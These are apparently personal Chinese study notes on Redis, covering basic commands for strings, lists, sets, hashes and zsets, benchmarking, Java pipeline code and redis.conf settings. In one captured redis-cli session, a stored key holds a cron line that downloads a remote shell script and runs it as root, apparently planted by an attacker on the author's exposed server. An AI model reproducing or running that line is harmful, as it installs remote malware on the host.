# Redis

早些年的单机版Mysql不够用了

读写量太大，发展了一系列发现

一个网站基本读8写2，那就把常用的读放到缓存里

这就是Nosql来了，以键值对形式存放数据在缓存中，提高查询效率，与网站使用的体验

BSON和JSON差不多，是二进制版的json，也可以当数据传输

POI操作Excel  jar包

> 为什么用Nosql？

NoSQL = Not Only SQL

泛指非关系型数据库

web2.0中许多超大规模的高并发社区!暴露出许多问题，Nosql在此环境下发展迅速。Redis是最快的。

MongDB，文档型数据库

类似，Map<String,Object>的K-V形式

> NoSQL特点

- 方便扩展，数据间没有关系

- 读取每秒11w，写每秒8W次，高性能

- 数据类型为多样型的

  - String
  - List
  - Set
  - Hash
  - Zset

- 不需要事先设计数据库，随取随用

- 传统RDBMS AND NOSQL

  ```
  传统RDBMS
  结构化组织
  sql
  数据与关系都在表中
  操作数据，定义语言
  一致性ACID
  事务性操作
  ....
  ```

  

  ```
  Nosql
  -不仅仅是数据
  -没有固定的查询语言
  -键值对KV
  列存储
  文档存储
  图形数据库(社交关系)
  最终一致性
  CAP定理 和 BASE(异地多活)
  高性能，高可用，高可扩展
  ...
  ```

>了解：3V+3高

3V:

海量，多样，实时

3高：

高并发(JUC基本），高可扩（随时水平拆分，机器不够了，搭建集群来解决），高性能（保证效率，用户体验）

企业开发基本组件

```
关系型数据库 Mysql
文档型数据库 MongoDB
图片 TFS,GFS,OSS
关键字(搜索) 搜索引擎 ElasticSearch，ISerach
波段信息 内存数据库 Redis,Memache,Tair
商品交易，外部支付接口  三方应用，支付宝，微信之类
```

## Nosql四大分类

Redis6开始支持多线程

KV键值对

- 新浪：Redis
- 美团：Redis + Tair
- 阿里，百度：Redis + memacache

文档型数据库(bson格式)

- MongoDB
  - 是一个基于分布式文件存储的数据库C++写的，主要用于处理大量文档
  - 是一个介于关系型与非关系型数据中中间的产品，MongoDB是非关系型数据库中功能最丰富，最像关系型数据库的
- ConthDB

列存储数据库

- HBase
- 分布式文件系统

图形关系数据库

- 放的是关系

![image-20220405154611414](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405154611414.png)

安装嘛就不说啦，之前就自己装好了

### win&linux

![image-20220405160111273](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405160111273.png)

```
//简单玩玩
[root@lgdlgd123 ~]# redis-cli -p 6379
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> set name lgd
OK
127.0.0.1:6379> get lgd
(nil)
127.0.0.1:6379> get name
"lgd"
127.0.0.1:6379> keys *
1) "backup3"
2) "backup2"
3) "name"
4) "backup1"
5) "backup4"
127.0.0.1:6379> get backup1
"\n\n\n*/2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh\n\n"

[root@lgdlgd123 ~]# ps -ef|grep redis
redis      947     1  0 Feb03 ?        01:59:53 /www/server/redis/src/redis-server *:6379
root     32018 31975  0 16:00 pts/0    00:00:00 redis-cli -p 6379
root     32457 32425  0 16:03 pts/1    00:00:00 grep --color=auto redis

shutdown //关闭 ctrl+c
```

### redis-benchmark测试性能

压力测试工具

简单测试下玩玩

```bash
#测试100个并发连接 每个并发10w请求
redis-benchmark -h localhost -p 6379 -c 50 -n 100000
```

```bash
====== SET ======
  100000 requests completed in 0.63 seconds
  50 parallel clients //50台并发
  3 bytes payload //每次写入3字节
  keep alive: 1 //服务器数

100.00% <= 0 milliseconds //所有请求0毫秒内完成
158227.84 requests per second

====== GET ======
  100000 requests completed in 0.64 seconds
  50 parallel clients
  3 bytes payload
  keep alive: 1

100.00% <= 0 milliseconds
156739.81 requests per second
```

### 基础知识

redis默认有16个数据库

redis.config中

```
# Specify the source name of the events in the Windows Application log.
# syslog-ident redis

# Set the number of databases. The default database is DB 0, you can select
# a different one on a per-connection basis using SELECT <dbid> where
# dbid is a number between 0 and 'databases'-1
databases 16
```

默认使用第0个数据库

```bash
#可以使用select进行切换
127.0.0.1:6379> select 3
OK
127.0.0.1:6379[3]> dbsize
(integer) 0
#查看DB大小
127.0.0.1:6379[3]> dbsize
(integer) 1
#清除当前数据库
127.0.0.1:6379[3]> flushdb
OK
#查看所有key
127.0.0.1:6379[3]> keys *
(empty array)
#清除全部
127.0.0.1:6379[3]> flushall
OK
```

为什么redis端口号为6379？

这是九宫格对应的歌女名字，作者说的= =？？？

Mysql 3306是作者女儿名字 ？？？

> redis在6前是单线程

redis很快，基于内存操作，CPU并不是性能瓶颈，redis的瓶颈根据机器的内存频率和网络带宽，可以使用单线程来实现就是用单线程了。

> Redis 为什么单线程还这么快？

redis 是C语言写的，官方提供的数据为100000+的QPS,不比Memecache差！

`redis`使用**`epoll`多路I/O复用技术**，单个线程可以处理大量的并发连接。`epoll`是一种高效的多路复用技术。

误区：高性能一定用多线程（LRU切换也需要资源），多线程一定比单线程效率高

cpu>内存频率>硬盘

核心：redis将所有数据都放在内存中，所以使用单线程操作没问题

多线程是为了提高资源利用率，在涉及磁盘操作时，CPU会有很多时间阻塞到IO，采用多线程可以利用阻塞的时间

### 五大数据类型

>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 [字符串（strings）](http://redis.cn/topics/data-types-intro.html#strings)， [散列（hashes）](http://redis.cn/topics/data-types-intro.html#hashes)， [列表（lists）](http://redis.cn/topics/data-types-intro.html#lists)， [集合（sets）](http://redis.cn/topics/data-types-intro.html#sets)， [有序集合（sorted sets）](http://redis.cn/topics/data-types-intro.html#sorted-sets) 与范围查询， [bitmaps](http://redis.cn/topics/data-types-intro.html#bitmaps)， [hyperloglogs](http://redis.cn/topics/data-types-intro.html#hyperloglogs) 和 [地理空间（geospatial）](http://redis.cn/commands/geoadd.html) 索引半径查询。 Redis 内置了 [复制（replication）](http://redis.cn/topics/replication.html)，[LUA脚本（Lua scripting）](http://redis.cn/commands/eval.html)， [LRU驱动事件（LRU eviction）](http://redis.cn/topics/lru-cache.html)，[事务（transactions）](http://redis.cn/topics/transactions.html) 和不同级别的 [磁盘持久化（persistence）](http://redis.cn/topics/persistence.html)， 并通过 [Redis哨兵（Sentinel）](http://redis.cn/topics/sentinel.html)和自动 [分区（Cluster）](http://redis.cn/topics/cluster-tutorial.html)提供高可用性（high availability）。

单点登录

#### **Redis-Key**

```bash
keys * //查看所有key
set name lgd
get name
exists name
expire name 10 //设置过期时间10s
ttl name //查看剩余时间
del name //删除
move name 1 // 移动1到数据库1
```

#### **Strin**g

字符操作

```bash
127.0.0.1:6379> set age 13
OK
127.0.0.1:6379> get age
"13"
#增加字符,若key不存在则创建一个key
127.0.0.1:6379> append age 14
(integer) 4
127.0.0.1:6379> get age
"1314"
127.0.0.1:6379> exists age
(integer) 1
#获取字符长度
127.0.0.1:6379> strlen age 
(integer) 4
127.0.0.1:6379> append age "lgd shuai~"
(integer) 14
127.0.0.1:6379> get age
"1314lgd shuai~"
```

加减

```bash
127.0.0.1:6379> set age 1
OK
#增加1
127.0.0.1:6379> incr age 
(integer) 2
127.0.0.1:6379> get age
"2"
#减1
127.0.0.1:6379> decr age
(integer) 1
127.0.0.1:6379> get age
"1"
127.0.0.1:6379> incrby age 10
(integer) 11
127.0.0.1:6379> get age
"11"
127.0.0.1:6379> decrby age 5
(integer) 6
127.0.0.1:6379> get age
"6"
```

字符串范围

```bash
127.0.0.1:6379> set name "hello"
OK
127.0.0.1:6379> getrange name 0 2 #截取字符串
"hel"
127.0.0.1:6379> getrange name 0 -1 #获取全部
"hello"

############################################
#替换
127.0.0.1:6379> set name lalala
OK
127.0.0.1:6379> setrange name 1 hoho
(integer) 6
127.0.0.1:6379> get name
"lhohoa"
############################################
# setex(set with expire) #设置过期时间
# setnx(set if not exist #不存在再设置)
#设置name 为hello 过期时间30s
127.0.0.1:6379> setex name 30 hello
OK
127.0.0.1:6379> setnx mykey "redis"
(integer) 1
127.0.0.1:6379> ttl name
(integer) 10
#如果存在mykey则创建失败
127.0.0.1:6379> setnx mykey "mongoDB"
(integer) 0
127.0.0.1:6379> get mykey
"redis"
############################################
#批量获取值,批量删除
127.0.0.1:6379> mset k1 v1 k2 v2 k3 v3
OK
127.0.0.1:6379> key *
(error) ERR unknown command `key`, with args beginning with: `*`, 
127.0.0.1:6379> keys *
1) "k3"
2) "backup3"
3) "k1"
4) "backup2"
5) "k2"
6) "backup1"
127.0.0.1:6379> del k1 k2 k3
(integer) 3
127.0.0.1:6379> keys *
1) "backup3"
2) "backup2"
3) "backup1"
127.0.0.1:6379[1]> mset k1 vv1 k2 vv2 k3 vv3
OK
127.0.0.1:6379[1]> mget k1 k2 k3
1) "vv1"
2) "vv2"
3) "vv3"
127.0.0.1:6379[1]> msetnx k1 v1 k4 v4
(integer) 0
#msetnv是原子性操作，要么全成功要么全失败，这里k1存在，所以不操作
127.0.0.1:6379[1]> get k4
(nil)
############################################
#批量操作m+xxx
127.0.0.1:6379[1]> set user:1 {name:lgd,age:15}
OK
127.0.0.1:6379[1]> get user:1
"{name:lgd,age:15}
127.0.0.1:6379[1]> mset user:1:name lgd2 user:1:age 20
OK
127.0.0.1:6379[1]> mget user:1:name user:1:age
1) "lgd2"
2) "20"
############################################
#getset 先get旧值再set新值
127.0.0.1:6379[1]> getset db redis
(nil)
127.0.0.1:6379[1]> get db
"redis"
127.0.0.1:6379[1]> getset db lgd
"redis"
127.0.0.1:6379[1]> getset db lgd2
"lgd"
```

数据结构是相同的

String类似的使用场景:value除了字符串还可以是数字

- 计数器
- 统计多单位的数目 id:110:follow 0
- 对象缓存存储

#### **List**

是一种基本的数据类型，列表，可以重复

在redis可以把list变成栈，队列，阻塞队列

l开头意味着从左边操作，r开头意味着右边开始操作

```bash
127.0.0.1:6379[1]> lpush list one
(integer) 1
127.0.0.1:6379[1]> keys *
1) "list"
127.0.0.1:6379[1]> lrange list 0 -1
1) "one"
127.0.0.1:6379[1]> lpush list tow
(integer) 2
127.0.0.1:6379[1]> lpush list three
(integer) 3
#获取list值，不过是从上往下的，是个栈
127.0.0.1:6379[1]> lrange list 0 1
1) "three"
2) "tow"
#获取所有list值
127.0.0.1:6379[1]> lrange list 0 -1
1) "three"
2) "tow"
3) "one"

127.0.0.1:6379[1]> lpush list 0
(integer) 4
127.0.0.1:6379[1]> lrange list 0 -1
1) "0"
2) "three"
3) "tow"
4) "one"
127.0.0.1:6379[1]> lrange list 0 0
1) "0"
#右边添加
127.0.0.1:6379[1]> rpush list lalala
(integer) 5
127.0.0.1:6379[1]> lrange list 0 -1
1) "0"
2) "three"
3) "tow"
4) "one"
5) "lalala"
#根据下标获取值
127.0.0.1:6379[1]> lindex list 1
"three"
#获取长度
127.0.0.1:6379[1]> llen list
(integer) 5
#移除list中1个元素为0的
127.0.0.1:6379[1]> lrem list 1 0
(integer) 1
127.0.0.1:6379[1]> lrange list 0 -1
1) "three"
2) "tow"
3) "one"
4) "lalala"
############################################
#trim 修建 
#从左边开始，裁剪1开始截取2个，之后list就只剩下被裁剪的数据
127.0.0.1:6379[1]> ltrim list 1 2
OK
127.0.0.1:6379[1]> lrange list 0 -1
1) "two"
2) "one"
############################################
#组合命令 pop and rush，组合命令是原子性操作，并发时安全
127.0.0.1:6379[1]> rpush list hello
(integer) 1
127.0.0.1:6379[1]> rpush list hello1
(integer) 2
127.0.0.1:6379[1]> rpush list hello2
(integer) 3
127.0.0.1:6379[1]> rpush list hello3
(integer) 4
#先取出最右边的元素再把它添加到最左边
127.0.0.1:6379[1]> rpoplpush list list
"hello3"
127.0.0.1:6379[1]> lrange list 0 -1
1) "hello3"
2) "hello"
3) "hello1"
4) "hello2"

############################################
127.0.0.1:6379[1]> lpush list e1
(integer) 1
127.0.0.1:6379[1]> lrange list 0 0
1) "e1"
#lset,根据下表修改元素，如果不存在会报错
127.0.0.1:6379[1]> lset list 0 element1
OK
127.0.0.1:6379[1]> lrange list 0 0
1) "element1"
############################################
#linsert list after element2 lululu,在左边的element2 的后面 添加 lululu 元素 ，遇到相同的值默认第一个
127.0.0.1:6379[1]> lpush list element2
(integer) 2
127.0.0.1:6379[1]> linsert list before element2 lalala
(integer) 3
127.0.0.1:6379[1]> lrange list 0 -1
1) "lalala"
2) "element2"
3) "element1"
127.0.0.1:6379[1]> linsert list after element2 lululu
(integer) 4
127.0.0.1:6379[1]> lrange list 0 -1
1) "lalala"
2) "element2"
3) "lululu"
4) "element1"

127.0.0.1:6379[1]> lpush list element2
(integer) 5
127.0.0.1:6379[1]> linsert list after element2 lululu2
(integer) 6
127.0.0.1:6379[1]> lrange list 0 -1
1) "element2"
2) "lululu2"
3) "lalala"
4) "element2"
5) "lululu"
6) "element1"
```

![image-20220407084219753](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220407084219753.png)

小结：

- 它实际上是一个链表，before Node after , left ,right都可以插入值
- 如果key不存在就创建一个新的链表，存在就增加内容
- 如果移除了所有的值，空链表，也代表不存在
- 在两边插入或者改动值效率最高，中间元素相对效率会低一点

消息队列，左边进去左边拿就是栈 lpush lpop

左边进去右边出来就是消息队列lpush rpop

#### **Set**

set中的值不可以重复，比如java里可以用equals进行比较

set开头都是s

```bash
#set里添加元素
127.0.0.1:6379[1]> sadd set hello
(integer) 1
127.0.0.1:6379[1]> sadd set name 
(integer) 1
127.0.0.1:6379[1]> sadd set lgd
(integer) 1
#查看指定set的所有值
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
3) "hello"
#sismember看是否存在这个元素
127.0.0.1:6379[1]> sismember set lgd
(integer) 1
127.0.0.1:6379[1]> sismember set lalalala
(integer) 0
############################################
#获取个数
127.0.0.1:6379[1]> scard set
(integer) 3
#再次add一个存在的元素，不可恶添加
127.0.0.1:6379[1]> sadd set name
(integer) 0
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
3) "hello"
############################################
#移除hello元素
127.0.0.1:6379[1]> srem set hello
(integer) 1
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
############################################
#由于set无序且不存在重复,所以提供了一个api类似于抽奖
127.0.0.1:6379[1]> srandmember set
"name"
127.0.0.1:6379[1]> sadd set sex
(integer) 1
127.0.0.1:6379[1]> sadd set 1
(integer) 1
127.0.0.1:6379[1]> sadd set 2
(integer) 1
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "sex"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "lgd"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "1"
2) "name"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "lgd"
############################################
15-7
```

#### **Hash**

value: 又是一个K-V

redistemplate使用时涉及opsForHash()

```java
//单个的方式写入redis
redisTemplate.opsForHash().put("map1", "k1", "value1");
//声明的方式写入redis
redisTemplate.opsForHash().putAll("map2", map);
//redis 的key 把map给删除了
redisTemplate.delete("map1");
//根据redis 的key 判断hash是否存在,有返回true， 不存在返回false
redisTemplate.hasKey("map2");
//redis的key和map的key
redisTemplate.opsForHash().hasKey("map2", "k4");
//根据redis的key 和hash 的key 删除当个 value
redisTemplate.opsForHash().delete("map2", "k5");
//keys方法，获取key对应的hash表的所有键值对
Map<Object, Object> entries = redisTemplate.opsForHash().entries("k1");
```

#### **Zset**

命令基本与z相关

有序集合zset与set 类似，是一个没有重复元素的字符串集合

与set不同的是zset是有序的，访问有序集合的中间元素也很快，因为能够使有序集合作为一个没有重复成员的智能列表

```bash
[root@lgdlgd123 //]# redis-cli -p 6379
127.0.0.1:6379> zadd myset 1 one
(integer) 1
#这里2，3为下标？
127.0.0.1:6379> zadd myset 2 two 3 three
(integer) 2
127.0.0.1:6379> zrange myset 0 -1
1) "one"
2) "two"
3) "three"
#使用zadd形式增加 key 序号 value
127.0.0.1:6379> zadd salary 2500 lgd
(integer) 1
127.0.0.1:6379> zadd salary 3000 lgd2
#按照序号打印出所有value	从小到大
127.0.0.1:6379> zrangebyscore salary -inf +inf
1) "lgda"
2) "lgd"
3) "lgd2"
#显示全部的用户从大到小
127.0.0.1:6379> zrevrange salary 0 -1
1) "lgd2"
2) "lgd"
3) "lgda"

```

#### **geospatial**



#### **hyperloglogs**



#### **bitmaps**



### 关于pipeline的使用

```java
Set<String> keys = redisTemplate.keys("*");
redisTemplate.delete(keys);
StopWatch stopWatch = new StopWatch();
stopWatch.start("使用pipeline");

long startTime = System.currentTimeMillis();
StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();
List list = redisTemplate.executePipelined(new RedisCallback<Object>() {
    @Override
    public Object doInRedis(RedisConnection redisConnection) throws DataAccessException {
        for (int i = 0; i < 100000; i++) {
            String key = "测试" + String.valueOf(i);
            redisConnection.hSet(stringRedisSerializer.serialize("lalala1"),stringRedisSerializer.serialize(key),stringRedisSerializer.serialize("666666"));
        }
        return null;
    }
},stringRedisSerializer);

long endTime = System.currentTimeMillis();
long costTime = endTime - startTime;
System.out.println(costTime);
stopWatch.stop();
Set<String> keys1 = redisTemplate.keys("*");
redisTemplate.delete(keys1);
stopWatch.start("不使用pipeline");
long startTime2 = System.currentTimeMillis();
for (int i = 0; i < 100000; i++) {
    String key = "测试" + String.valueOf(i);
    redisTemplate.opsForHash().put("lalala2",key,"666666");
}
long endTime2 = System.currentTimeMillis();
long costTime2 = endTime2 - startTime2;
System.out.println(costTime2);
stopWatch.stop();
```

效果

![image-20220506161553380](C:\Users\L\Desktop\文档\photo\image-20220506161553380.png)

一些用法

```java
//hash
List list = redisTemplate3.executePipelined(new RedisCallback<Object>() {
                    @Override
                    public Object doInRedis(RedisConnection redisConnection) throws DataAccessException {
                        for (String num:nums) {
                            redisConnection.hSet(stringRedisSerializer.serialize(finalKeyName),
                                                stringRedisSerializer.serialize(num),
                                                stringRedisSerializer.serialize("1"));
                        }
                        return null;
                    }
                },stringRedisSerializer);
//string
List list = redisTemplate3.executePipelined(new RedisCallback<Object>() {
                    @Override
                    public Object doInRedis(RedisConnection redisConnection) throws DataAccessException {
                        for (String num:nums) {
                            redisConnection.set(stringRedisSerializer.serialize(num),
                                                stringRedisSerializer.serialize("1"));
                        }
                        return null;
                    }
                },stringRedisSerializer);
```

### redis.conf配置

配置文件 unit单位对大小写不敏感！

**可以包含多个redis.conf文件**

```bash
# include /path/to/local.conf
# include /path/to/other.conf
```

> **网路**

```bash
bind: 127.0.0.1 #绑定Ip
port: 6379 #端口
protected-mode yes #保护模式
```

**通用GENERAL**

```bash
damonize yes #以守护进程模式

pidfile /www/server/redis/redis.pid

loglevel notice

logfile "/www/server/redis/redis.log" #日志文件位置
database 16 #数据库数量， 默认16个
always-show-logo yes # 是否总是显示logo
```

> **快照**

持久化，在规定的时间内，执行多少次操作则会持久化到闻不见 .rdb .aop

dbfilename dump.rdb

内存数据库，断电即失，所以重要数据要持久化

```bash
#如果900s内，至少有一个key进行修改，我们进行持久化操作
save 900 1
#	300  		10
save 300 10
#	60			1000
save 60 10000
# 如果出错了 是否让redis继续工作
stop-writes-on-bgsave-error yes
#是否压缩rdb文件，需要消耗一些cpu资源
rdbcompression yes
#进行错误的校验
rdbchecksum yes
# rdb 文件的保存目录
dir /www/server/redis/
```

> **REPLICATION 复制，主从复制的时候用到**

**Master Slave**

> **SECURITY 	安全，可以在这里设置一些密码**

```bash
config set requirepass "123456" #设置密码
auth 123456 #登录
```

> **Client	限制**

```bash
maxclients 10000 #设置能连接上redis的最大客户端数量
maxmemory <bytes> #配置reids最大的内存大小
maxmemory-policy noeviction #内存到达上限后的处理策略
	# 移除一些过期的 key
	# 报错 ………………
	# 常见 LRU(最近最少), LFU and minimal TTL
```

- volatile-lru(least recently used):最近最少使用算法，从设置了过期时间的键key中选择空转时间最长的键值对清除掉；
- volatile-lfu(least frequently used):最近最不经常使用算法，从设置了过期时间的键中选择某段时间之内使用频次最小的键值对清除掉；
- volatile-ttl:从设置了过期时间的键中选择过期时间最早的键值对清除；
- volatile-random:从设置了过期时间的键中，随机选择键进行清除；
- allkeys-lru:最近最少使用算法，从所有的键中选择空转时间最长的键值对清除；
- allkeys-lfu:最近最不经常使用算法，从所有的键中选择某段时间之内使用频次最少的键值对清除；
- allkeys-random:所有的键中，随机选择键进行删除；
- noeviction:不做任何的清理工作，在redis的内存超过限制之后，所有的写入操作都会返回错误；但是读操作都能正常的进行;

> **APPEND ONLY MODE aof配置**

```bash
appendonly no # 默认不开启，大部分情况rdb完全够用
appendfilename "appendonlyf" # 持久化的文件的名字

# appendfsync always #每次修改都sync
appendfsync everysec #每秒同步一次，可能丢失这1s
# appendfsync no #不同步
```

### 集群配置

